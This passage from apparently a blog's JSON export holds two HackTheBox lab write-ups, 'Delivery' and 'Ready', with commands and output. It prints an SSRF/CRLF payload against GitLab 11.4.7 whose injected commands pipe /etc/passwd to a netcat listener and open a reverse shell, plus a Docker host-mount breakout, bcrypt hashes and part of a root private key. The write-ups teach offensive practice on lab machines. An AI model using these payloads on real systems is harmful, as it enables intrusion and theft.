\u0026ldquo;Check Ticket Status\u0026rdquo; menu.\n Open a New Ticket According to the message at http://delivery.htb/#contact-us, guest user seems to be allowed to create a ticket here.\nFor unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you\u0026#39;ll be able to have access to our MatterMost server. I\u0026rsquo;ll create one.\n Once the ticket request is submitted, it notifies that the ticket has been created.\n Besides the ticket id, it also gives us a temporary email with domain of delivery.htb, and I\u0026rsquo;ll note that:\n Ticket : 4709941 Email: 4709941@delivery.htb.  The created ticket can be accessed/viewed on “Check Ticket Status” menu.\n Finding vulnerabilities - Exploit-DB The app source code is available on Github: https://github.com/osTicket/osTicket. But, it seems I\u0026rsquo;ll need an admin access to find the version.\nYou guess it, we can limit the search based on the box release (9 January 2021):\n But those exploits mostly XSS that requires a user interaction and there is no indication for that in this box, so let’s move to the next one.\nTCP 8065 — Mattermost There is an instance of Mattermost here and it requires an account.\n Sign up is allowed, but the page clearly shows that valid email is required.\n And here is why a valid email is required, there is a verification process.\n Foothold Shell as maildeliverer Access to Mattermost using TicketTrick The idea of TicketTrick here is to use the temporary email address given by the support ticket system to register on Mattermost.\nFor me, the previous email is: 4709941@delivery.htb. I’ll use that to register on Mattermost.\n The verification is sent to 4709941@delivery.htb.\n Back on helpdesk, I can see the verification link to activate the my previously created Mattermost account.\n Visiting http://delivery.htb:8065/do_verify_email?token=eoy11mus8h6m4hctpmwt9qw31cdsfcxzbg7noyc5gzpc6htp9e8mqe55wwewaju9\u0026amp;email=4709941%40delivery.htb redirects back to MatterMost which confirms the email has been verified.\n Upon logging in, I\u0026rsquo;m able to join the Internal channel (like server on Discord). There is one channel called internal.\n The chats from root contain a set of credentials and a few hints which indicates that they use a variant password of “PleaseSubscribe!”.\nSSH - maildeliverer The credentials of maildeliverer works on SSH.\n→ root@kali «delivery» «10.10.14.70» $ ssh maildeliverer@delivery.htb ... maildeliverer@delivery.htb\u0026#39;s password: Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 ... Last login: Fri May 21 14:11:23 2021 from 10.10.16.16 maildeliverer@Delivery:~$ id uid=1000(maildeliverer) gid=1000(maildeliverer) groups=1000(maildeliverer) The user flag is done here.\nmaildeliverer@Delivery:~$ ls -l total 4 -r-------- 1 maildeliverer maildeliverer 33 May 21 11:21 user.txt  Privilege Escalation Shell as root Internal Enumeration Enumerating on /opt finds the Mattermost installation folder. The Mattermost config file contains the database credentials.\nmaildeliverer@Delivery:/opt/mattermost/config$ cat config.json | grep SqlSetting -A10 \u0026#34;SqlSettings\u0026#34;: { \u0026#34;DriverName\u0026#34;: \u0026#34;mysql\u0026#34;, \u0026#34;DataSource\u0026#34;: \u0026#34;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\\u0026readTimeout=30s\\u0026writeTimeout=30s\u0026#34;, \u0026#34;DataSourceReplicas\u0026#34;: [], \u0026#34;DataSourceSearchReplicas\u0026#34;: [], \u0026#34;MaxIdleConns\u0026#34;: 20, \u0026#34;ConnMaxLifetimeMilliseconds\u0026#34;: 3600000, \u0026#34;MaxOpenConns\u0026#34;: 300, \u0026#34;Trace\u0026#34;: false, \u0026#34;AtRestEncryptKey\u0026#34;: \u0026#34;n5uax3d4f919obtsp1pw1k5xetq1enez\u0026#34;, \u0026#34;QueryTimeout\u0026#34;: 30, The credentials is mmuser:Crack_The_MM_Admin_PW.\nMySQL - Dump Passwords With database credentials, I can connect to the MySQL service.\nmaildeliverer@Delivery:/opt/mattermost/config$ mysql mattermost -u mmuser -pCrack_The_MM_Admin_PW Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 395 Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. MariaDB [mattermost]\u0026gt; There is a users table which usually contains something juicy.\nMariaDB [mattermost]\u0026gt; show tables; +------------------------+ | Tables_in_mattermost | +------------------------+ ... | Users | +------------------------+ 46 rows in set (0.001 sec) I can get the columns of the table user by querying describe Users;.\nMariaDB [mattermost]\u0026gt; describe Users; +--------------------+--------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +--------------------+--------------+------+-----+---------+-------+ | Id | varchar(26) | NO | PRI | NULL | | | CreateAt | bigint(20) | YES | MUL | NULL | | | UpdateAt | bigint(20) | YES | MUL | NULL | | | DeleteAt | bigint(20) | YES | MUL | NULL | | | Username | varchar(64) | YES | UNI | NULL | | | Password | varchar(128) | YES | | NULL | | ... +--------------------+--------------+------+-----+---------+-------+ 25 rows in set (0.001 sec) I\u0026rsquo;ll dump that the username and password columns from the table Users.\nMariaDB [mattermost]\u0026gt; select Username,Password from Users; +----------------------------------+--------------------------------------------------------------+ | Username | Password | +----------------------------------+--------------------------------------------------------------+ | surveybot | | | c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK | | 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G | | testmail | $2a$10$gSBaz3a76sX.ikqynx4E7O2NYn9.q6fcSopTwYP672lJMSbZ6.IQa | | help | $2a$10$zsb4KbggZbpQi2Wa8W0.C.lHVJxiUBr6cyNFbDbWu11j6JBJrVkpm | | root | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | | ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq | | channelexport | | | 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm | | aaaa | $2a$10$yIdqqOXl.5dcWsXk.Doo2ewl.zTFdsDd2F0.c44iWOpGMIgmDTsY6 | | iiamf | $2a$10$esA8d/l5.IKQJIhnl2SeYeeoFaCOE6Z/esUOSuRb.Vqtkf3gvbli6 | | iamf | $2a$10$ZYEM.GLMnAfq8eM.2rs8q.e/q3bHaOVOCvlu7YGhU0rU0Ug4PME9a | +----------------------------------+--------------------------------------------------------------+ 12 rows in set (0.000 sec) MariaDB [mattermost]\u0026gt; Those are bcrypt hashes, but let’s prioritize the root hash.\nCracking the Hash Based on the conversations on Mattermost, there is someone in the system that uses a variant of “PleaseSubscribe!” and they were talking about hashcat rules.\nI remember exactly that Ippsec (the box author) has shown several techniques on how to generate a variant of seasonal passwords on Forest .\nNow the idea is instead of generating seasonal passwords, I can try to generate a few variant of \u0026ldquo;PleaseSubscribe!\u0026rdquo; and use them for cracking.\nSo, I\u0026rsquo;ll start by calculating the length of “PleaseSubscribe!”.\n→ root@kali «delivery» «10.10.14.70» $ echo -n \u0026#39;PleaseSubsribe!\u0026#39; | wc -c 15 It has length of 15. I\u0026rsquo;ll save the \u0026ldquo;PleaseSubscribe!\u0026rdquo; string to a file.\n→ root@kali «delivery» «10.10.14.70» $ echo \u0026#39;PleaseSubscribe!\u0026#39; \u0026gt; IppsecSubscriber Then I’ll feed that file to hashcat to generate some new variant of it using base64 rule, and I\u0026rsquo;ll take out only the string which has a length greater than 15 and pipe the output to a file called custom_wordlist.\n→ root@kali «delivery» «10.10.14.70» $ hashcat IppsecSubscriber -r /usr/share/hashcat/rules/best64.rule --stdout | awk \u0026#39;length($0) \u0026gt; 15\u0026#39; \u0026gt; custom_wordlist It produces 46 words.\n→ root@kali «delivery» «10.10.14.70» $ wc -w custom_wordlist 46 custom_wordlist With that wordlist the hash gets cracked instantly!\nC:\\tools\\hashcat6\u0026gt;hashcat.exe -m 3200 \u0026#39;$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO\u0026#39; custom_wordlist --force .... $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21 Session..........: hashcat Status...........: Cracked Hash.Name........: bcrypt $2*$, Blowfish (Unix) Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO Time.Started.....: Mon Mar 15 21:36:35 2021 (1 sec) Time.Estimated...: Mon Mar 15 21:36:36 2021 (0 secs) .... The recovered password is PleaseSubscribe!21.\nSU - root That password works on root user.\nmaildeliverer@Delivery:~$ su root Password: root@Delivery:/home/maildeliverer# id uid=0(root) gid=0(root) groups=0(root) Now I can just grab the root flag.\nroot@Delivery:/home/maildeliverer# cd ~ root@Delivery:~# ls -l total 16 -rwxr-x--- 1 root root 103 Dec 26 11:26 mail.sh -r-------- 1 root root 382 Dec 28 07:02 note.txt -rw-r----- 1 root root 1499 Dec 26 10:55 py-smtp.py -r-------- 1 root root 33 May 21 11:21 root.txt root@Delivery:~# cat *.txt I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I\u0026#39;ve seen several times. The inspiration for the box is here: - https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c Keep on hacking! And please don\u0026#39;t forget to subscribe to all the security streamers out there. - ippsec a7d68baadc3b3c072c6...\u0026lt;SNIP\u0026gt;... There is also a message from the box’s author:\nroot@Delivery:~# cat note.txt I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I\u0026#39;ve seen several times. The inspiration for the box is here: - https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c Keep on hacking! And please don\u0026#39;t forget to subscribe to all the security streamers out there.  References  https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-delivery/","summary":"Delivery from HackTheBox is all about exploiting a logic flaw called TicketTrick which was discovered by Inti De Ceukelaire.\nOn this machine, there is a helpdesk ticketing system that gives an unauthenticated user a temporary email with a legitimate company domain. Using that email, I\u0026rsquo;m able to register at Mattermost and gain access to the company private communication channel. The conversation in the channel leaks a set of SSH credentials and a password in which its variant is being used in the system.","tags":["Linux","Logic-flaw","TicketTrick","osTicket","Mattermost","Password-cracking","Hashcat","Hashcat-rule"],"title":"HackTheBox - Delivery"},{"content":"Ready is a medium difficulty Linux machine from HackTheBox that features a GitLab instance in a Docker container. By chaining two CVEs, I\u0026rsquo;m able to gain a foothold on the container. Enumerating inside the container discovers a password that can be used on container root account. The container is found to be running in privileged mode, and this can be abused to mount the host file system into the container.\nSkills Learned  GitLab 11.4.7 exploitation Chaining bugs from CVE-2018-19571 and CVE-2018-19585 Docker security  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux BurpSuite - Preinstalled in Kali Linux  Reconnaissance Nmap All ports scan with nmap discovers two open ports: SSH on port 22, and a HTTP web server on port 5080\n→ root@kali «ready» «10.10.14.20» $ nmap -p- -sV --reason -oA nmap/10-initial-ready \u0026#39;10.10.10.220\u0026#39; Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-14 04:53 EDT Nmap scan report for 10.10.10.220 Host is up, received echo-reply ttl 63 (0.18s latency). Not shown: 65533 closed ports Reason: 65533 resets PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 5080/tcp open http syn-ack ttl 62 nginx Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 503.44 seconds After performing a default script scan shows there\u0026rsquo;s a GitLab instance on port 5080.\n→ root@kali «ready» «10.10.14.20» $ nmap -p22,5080 -sC -sV --reason -oA nmap/10-default-ready 10.10.10.220 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-14 05:17 EDT Nmap scan report for 10.10.10.220 Host is up, received echo-reply ttl 63 (0.090s latency). PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 5080/tcp open http syn-ack ttl 62 nginx | http-robots.txt: 53 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.220:5080/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.70 seconds Enumeration TCP 5080 - GitLab The page displays a self-hosted GitLab Community Edition.\n I can register with any email domain.\n The GitLab version can be seen by visiting/help, and it seems to be an outdated one.\n I\u0026rsquo;ll take a note on the version.\nUser Enumeration via GitLab API I can enumerate the GitLab users via /api/v4/users, but in the end, this was not used.\n I\u0026rsquo;ll move and search for vulnerabilities.\nSearchsploit I can feed the GitLab version to searchsploit, and it returns with two exploits that match with the version.\n→ root@kali «~» «10.10.14.20» $ searchsploit GitLab 11.4.7 -------------------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------------------- --------------------------------- GitLab 11.4.7 - RCE (Authenticated) (2) | ruby/webapps/49334.py GitLab 11.4.7 - Remote Code Execution (Authenticated) (1) | ruby/webapps/49257.py -------------------------------------------------------------------------- --------------------------------- I relaxed the search keyword to find other potential exploits, and I found an arbitrary file read which previously was used to exploit Laboratory.\n→ root@kali «exploit» «10.10.14.20» $ searchsploit GitLab -------------------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------------------- --------------------------------- GitLab - \u0026#39;impersonate\u0026#39; Feature Privilege Escalation | ruby/webapps/40236.txt GitLab 11.4.7 - RCE (Authenticated) (2) | ruby/webapps/49334.py GitLab 11.4.7 - Remote Code Execution (Authenticated) (1) | ruby/webapps/49257.py GitLab 12.9.0 - Arbitrary File Read | ruby/webapps/48431.txt Gitlab 12.9.0 - Arbitrary File Read (Authenticated) | ruby/webapps/49076.py Gitlab 6.0 - Persistent Cross-Site Scripting | php/webapps/30329.sh Gitlab-shell - Code Execution (Metasploit) | linux/remote/34362.rb Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting | java/webapps/47927.txt NPMJS gitlabhook 0.0.17 - \u0026#39;repository\u0026#39; Remote Command Execution | json/webapps/47420.txt -------------------------------------------------------------------------- --------------------------------- Foothold Shell as git GitLab 11.4.7 RCE (CVE-2018-19571 \u0026amp; CVE-2018-19585) - PoC The RCE exploit that was popped on searchsploit above is consist of two vulnerabilities, SSRF (CVE-2018-19571) and CRLF Injection (CVE-2018-19585). The exploit\u0026rsquo;s author uses the LifeOverFlow\u0026rsquo;s blog post as reference. So I decided to read that blog and try to reproduce it here.\nWith SSRF, you can talk with the internal Redis server on port 6379 that used by GitLab as database, cache and message broker. If there is an HTTP request sent to the Redis server using SSRF, the request would read as follows (# ==\u0026gt; is a comment by me)\nGET blablabla HTTP/1.1 # ==\u0026gt; Redis read this as a command Host: [0:0:0:0:0:ffff:127.0.0.1]:6379 User-Agent: git/2.18.1 Accept: */* Accept-Encoding: deflate, gzip Pragma: no-cache - Err wrong number of arguments for \u0026#39;get\u0026#39; command The idea here is to use the CRLF Injection to insert a payload after the \u0026lsquo;GET\u0026rsquo; line.\nFor this, I’ll need Burp Suite turned on.\nOn GitLab, I’ll import a (non-exist) project and choose the \u0026ldquo;Repo by URL\u0026rdquo; menu.\n I\u0026rsquo;ll be using the same SSRF payload to bypass the GitLab URL filter which is git://[0:0:0:0:0:ffff:127.0.0.1]:6379/ and add my (non-exist) .git repository at the end of the URL, so it becomes git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/ssrf-test.git\n  The repository URL above is a special IPv6 address where its last 32 bits is used to embed the IPv4 address. The URL was used to bypass the SSRF protection defined in spec/lib/gitlab/url_blocker_spec.rb\n I\u0026rsquo;ll intercept the request after I hit the “Create Project” button, and then on BurpSuite, I’ll modify the import URL to this:\ngit://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/ multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push \u0026#34;{\\\u0026#34;class\\\u0026#34;:\\\u0026#34;GitlabShellWorker\\\u0026#34;,\\\u0026#34;args\\\u0026#34;:[\\\u0026#34;class_eval\\\u0026#34;,\\\u0026#34;open(\\\u0026#39;|cat /etc/passwd | nc 10.10.14.20 9000\\\u0026#39;).read\\\u0026#34;],\\\u0026#34;retry\\\u0026#34;:3,\\\u0026#34;queue\\\u0026#34;:\\\u0026#34;system_hook_push\\\u0026#34;,\\\u0026#34;jid\\\u0026#34;:\\\u0026#34;ad52abc5641173e217eb2e52\\\u0026#34;,\\\u0026#34;created_at\\\u0026#34;:1513714403.8122594,\\\u0026#34;enqueued_at\\\u0026#34;:1513714403.8129568}\u0026#34; exec exec /ssrf-test.git So the HTTP request now looks like this:\nPOST /projects HTTP/1.1 Host: 10.10.10.220:5080 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://10.10.10.220:5080/projects/new Content-Type: application/x-www-form-urlencoded Content-Length: 778 Connection: close Cookie: sidebar_collapsed=false; _gitlab_session=4426e39af6c1d3d4a4484a8a53f0bac9; event_filter=all Upgrade-Insecure-Requests: 1 utf8=%E2%9C%93\u0026amp;authenticity_token=cbS9UXXZDmvTgBUhOTMxF%2FOSii%2FgetcSbM%2FNTT2dG6NllhoQsV8uvbDU65arU9dEOumftKI48ZaDBi6rnJbjOQ%3D%3D\u0026amp;project%5Bimport_url%5D= git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/ multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push \u0026#34;{\\\u0026#34;class\\\u0026#34;:\\\u0026#34;GitlabShellWorker\\\u0026#34;,\\\u0026#34;args\\\u0026#34;:[\\\u0026#34;class_eval\\\u0026#34;,\\\u0026#34;open(\\\u0026#39;|cat /etc/passwd | nc 10.10.14.20 9000\\\u0026#39;).read\\\u0026#34;],\\\u0026#34;retry\\\u0026#34;:3,\\\u0026#34;queue\\\u0026#34;:\\\u0026#34;system_hook_push\\\u0026#34;,\\\u0026#34;jid\\\u0026#34;:\\\u0026#34;ad52abc5641173e217eb2e52\\\u0026#34;,\\\u0026#34;created_at\\\u0026#34;:1513714403.8122594,\\\u0026#34;enqueued_at\\\u0026#34;:1513714403.8129568}\u0026#34; exec exec /ssrf-test.git\u0026amp;project%5Bci_cd_only%5D=false\u0026amp;project%5Bname%5D=SSRF+test\u0026amp;project%5Bnamespace_id%5D=5\u0026amp;project%5Bpath%5D=ssrf-test\u0026amp;project%5Bdescription%5D=\u0026amp;project%5Bvisibility_level%5D=0 After I hit the send button, my nc listener caught the file contents of /etc/passwd.\nroot@kali «exploit» «10.10.14.20» $ nc -nvlp 9000 listening on [any] 9000 ... connect to [10.10.14.20] from (UNKNOWN) [10.10.10.220] 36612 ...\u0026lt;SNIP\u0026gt;... git:x:998:998::/var/opt/gitlab:/bin/sh gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh registry:x:993:993::/var/opt/gitlab/registry:/bin/sh gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh dude:x:1000:1000::/home/dude:/bin/bash  Weaponize - Reverse Shell From here, I’ll reproduce the step above, but this time I’ll send myself a shell. The payload as follows.\ngit://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/ multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push \u0026#34;{\\\u0026#34;class\\\u0026#34;:\\\u0026#34;GitlabShellWorker\\\u0026#34;,\\\u0026#34;args\\\u0026#34;:[\\\u0026#34;class_eval\\\u0026#34;,\\\u0026#34;open(\\\u0026#39;|nc -e /bin/bash 10.10.14.20 9000\\\u0026#39;).read\\\u0026#34;],\\\u0026#34;retry\\\u0026#34;:3,\\\u0026#34;queue\\\u0026#34;:\\\u0026#34;system_hook_push\\\u0026#34;,\\\u0026#34;jid\\\u0026#34;:\\\u0026#34;ad52abc5641173e217eb2e52\\\u0026#34;,\\\u0026#34;created_at\\\u0026#34;:1513714403.8122594,\\\u0026#34;enqueued_at\\\u0026#34;:1513714403.8129568}\u0026#34; exec exec /ssrf-to-rce.git On my nc listener:\n→ root@kali «exploit» «10.10.14.20» $ nc -nvlp 9000 listening on [any] 9000 ... connect to [10.10.14.20] from (UNKNOWN) [10.10.10.220] 37306 id uid=998(git) gid=998(git) groups=998(git) hostname gitlab.example.com pwd /var/opt/gitlab/gitlab-rails/working Shell Upgrade I\u0026rsquo;ll do the \u0026lsquo;stty\u0026rsquo; trick to upgrade my shell.\nwhich python3 /opt/gitlab/embedded/bin/python3 python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; git@gitlab:~/gitlab-rails/working$ ^Z [2] + 2354 suspended nc -nvlp 9000 → root@kali «exploit» «10.10.14.20» $ stty raw -echo; fg [2] - 2354 continued nc -nvlp 9000 git@gitlab:~/gitlab-rails/working$ git@gitlab:~/gitlab-rails/working$ export TERM=xterm On /home, there is only one user called dude, and I\u0026rsquo;m able to read the user flag there.\ngit@gitlab:/home/dude$ ls -la total 24 drwxr-xr-x 2 dude dude 4096 Dec 7 16:58 . drwxr-xr-x 1 root root 4096 Dec 2 10:45 .. lrwxrwxrwx 1 root root 9 Dec 7 16:58 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 dude dude 220 Aug 31 2015 .bash_logout -rw-r--r-- 1 dude dude 3771 Aug 31 2015 .bashrc -rw-r--r-- 1 dude dude 655 May 16 2017 .profile -r--r----- 1 dude git 33 Dec 2 10:46 user.txt git@gitlab:/home/dude$ cat user.txt e1e30b052b6ec0670698...\u0026lt;SNIP\u0026gt;... Privilege Escalation Shell as root Container enumeration I found a .dockerenv on the root directory which indicates that I\u0026rsquo;m inside container, and there is also a file called root_pass.\ngit@gitlab:~$ ls -la / total 104 drwxr-xr-x 1 root root 4096 Dec 1 12:41 . drwxr-xr-x 1 root root 4096 Dec 1 12:41 .. -rwxr-xr-x 1 root root 0 Dec 1 12:41 .dockerenv ...\u0026lt;SNIP\u0026gt;... -rw-r--r-- 1 root root 23 Jun 29 2020 root_pass The content of root_pass is a random string, which I think it is a password. I tried it to the user and root account but it didn\u0026rsquo;t work.\ngit@gitlab:/opt/backup$ cat /root_pass YG65407Bjqvv9A0a8Tm_7w Exploring on /opt, I found a folder called backup. The folder contains three files: docker-compose.yml, gitlab-secrets.json and gitlab.rb.\ngit@gitlab:/opt/backup$ ls -l total 100 -rw-r--r-- 1 root root 872 Dec 7 09:25 docker-compose.yml -rw-r--r-- 1 root root 15092 Dec 1 16:23 gitlab-secrets.json -rw-r--r-- 1 root root 79639 Dec 1 19:20 gitlab.rb Upon performing a recursive grep to search for files containing a \u0026ldquo;pass\u0026rdquo; string inside the folder, I discovered an SMTP password on gitlab.rb.\ngit@gitlab:/opt/backup$ grep -Ri \u0026#34;pass\u0026#34; ...\u0026lt;SNIP\u0026gt;... gitlab.rb:gitlab_rails[\u0026#39;smtp_password\u0026#39;] = \u0026#34;wW59U!ZKMbG9+*#h\u0026#34; ...\u0026lt;SNIP\u0026gt;... Looking into the docker-compose.yml, I see a potential vector for container breakout.\ngit@gitlab:/opt/backup$ cat docker-compose.yml  version: \u0026#39;2.4\u0026#39; services: web: image: \u0026#39;gitlab/gitlab-ce:11.4.7-ce.0\u0026#39; restart: always hostname: \u0026#39;gitlab.example.com\u0026#39; environment: GITLAB_OMNIBUS_CONFIG: |external_url \u0026#39;http://172.19.0.2\u0026#39; redis[\u0026#39;bind\u0026#39;]=\u0026#39;127.0.0.1\u0026#39; redis[\u0026#39;port\u0026#39;]=6379 gitlab_rails[\u0026#39;initial_root_password\u0026#39;]=File.read(\u0026#39;/root_pass\u0026#39;) networks: gitlab: ipv4_address: 172.19.0.2 ports: - \u0026#39;5080:80\u0026#39; #- \u0026#39;127.0.0.1:5080:80\u0026#39; #- \u0026#39;127.0.0.1:50443:443\u0026#39; #- \u0026#39;127.0.0.1:5022:22\u0026#39; volumes: - \u0026#39;./srv/gitlab/config:/etc/gitlab\u0026#39; - \u0026#39;./srv/gitlab/logs:/var/log/gitlab\u0026#39; - \u0026#39;./srv/gitlab/data:/var/opt/gitlab\u0026#39; - \u0026#39;./root_pass:/root_pass\u0026#39; privileged: true # ==\u0026gt; Potential privesc vector restart: unless-stopped #mem_limit: 1024m networks: gitlab: driver: bridge ipam: config: - subnet: 172.19.0.0/16 su - root (container) The password wW59U!ZKMbG9+*#h works on the container root account\ngit@gitlab:/opt/gitlab$ su root Password: wW59U!ZKMbG9+*#h root@gitlab:/opt/gitlab# id uid=0(root) gid=0(root) groups=0(root) Docker Breakout Based on the docker-compose.yml file, I suspect the container is running with privileged flag. According to my favorite blog, which is BookHackTrick, a container with privileged flag will have access to the host devices.\nAlthough, --privileged gives all the Linux capabilities, I\u0026rsquo;ll still check it manually to make sure I have access to the host devices.\nroot@gitlab:/opt/gitlab# capsh --print Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+eip ...\u0026lt;SNIP\u0026gt;... There is a CAP_SYS_ADMIN, with this capabilities I\u0026rsquo;m able to mount the host devices to make it available on the container. I can list all the host devices with fdisk -l.\nroot@gitlab:~# fdisk -l ...\u0026lt;SNIP\u0026gt;... Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: gpt Disk identifier: 32558524-85A4-4072-AA28-FA341BE86C2E Device Start End Sectors Size Type /dev/sda1 2048 4095 2048 1M BIOS boot /dev/sda2 4096 37746687 37742592 18G Linux filesystem # the root (/) dir /dev/sda3 37746688 41940991 4194304 2G Linux swap Now I can simply mount the Linux filesystem (/dev/sda2) to my specified folder.\nroot@gitlab:/media# mkdir iamf root@gitlab:/media# mount /dev/sda2 /media/iamf root@gitlab:/media# ls iamf/ bin cdrom etc lib lib64 lost+found mnt proc run snap sys usr boot dev home lib32 libx32 media opt root sbin srv tmp var The root user of the host has SSH keys, I’ll grab only the private key to my machine.\nroot@gitlab:/media# ls -l iamf/root/.ssh/ total 12 -rw------- 1 root root 405 Dec 7 16:49 authorized_keys -rw------- 1 root root 1675 Dec 7 16:49 id_rsa -rw-r--r-- 1 root root 405 Dec 7 16:49 id_rsa.pub root@gitlab:/media# cat iamf/root/.ssh/id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn 6KkYjWv+9kj9shzPaN1tNQLc2Rg39pn1mteyvUi2pBfA4ItE05F58WpCgh9KNMlf YmlPwjeRaqARlkkCgFcHFGyVxd6Rh4ZHNFjABd8JIl+Yaq/pg7t4qPhsiFsMwntX TBKGe8T4lzyboBNHOh5yUAI3a3Dx3MdoY+qXS/qatKS2Qgh0Ram2LLFxib9hR49W rG87jLNt/6s06z+Mwf7d/oN8SmCiJx3xHgFzbwIDAQABAoIBACeFZC4uuSbtv011 YqHm9TqSH5BcKPLoMO5YVA/dhmz7xErbzfYg9fJUxXaIWyCIGAMpXoPlJ90GbGof Ar6pDgw8+RtdFVwtB/BsSipN2PrU/2kcVApgsyfBtQNb0b85/5NRe9tizR/Axwkf iUxK3bQOTVwdYQ3LHR6US96iNj/KNru1E8WXcsii5F7JiNG8CNgQx3dzve3Jzw5+ lg5bKkywJcG1r4CU/XV7CJH2SEUTmtoEp5LpiA2Bmx9A2ep4AwNr7bd2sBr6x4ab VYYvjQlf79/ANRXUUxMTJ6w4ov572Sp41gA9bmwI/Er2uLTVQ4OEbpLoXDUDC1Cu K4ku7QECgYEA5G3RqH9ptsouNmg2H5xGZbG5oSpyYhFVsDad2E4y1BIZSxMayMXL g7vSV+D/almaACHJgSIrBjY8ZhGMd+kbloPJLRKA9ob8rfxzUvPEWAW81vNqBBi2 